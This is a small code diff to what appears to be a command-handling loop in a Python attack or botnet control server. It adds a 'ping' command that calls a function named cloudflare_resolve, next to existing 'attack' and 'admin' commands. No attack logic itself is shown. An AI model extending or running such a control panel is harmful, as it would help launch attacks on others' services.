@@ -114,6 +114,8 @@ def handle_connection(client, addr):
                         temporary_attack(client, Current.CurrentCmd['args'])
                 elif data.lower().startswith("admin"):
                         Admin_Command(client, Current.CurrentCmd['args'])
+                elif data.lower().startswith("ping"):
+                        cloudflare_resolve(client)                        
                         
                 if data != "\r\n" or data != "":
                         MainLogger.Log("CMD", True)
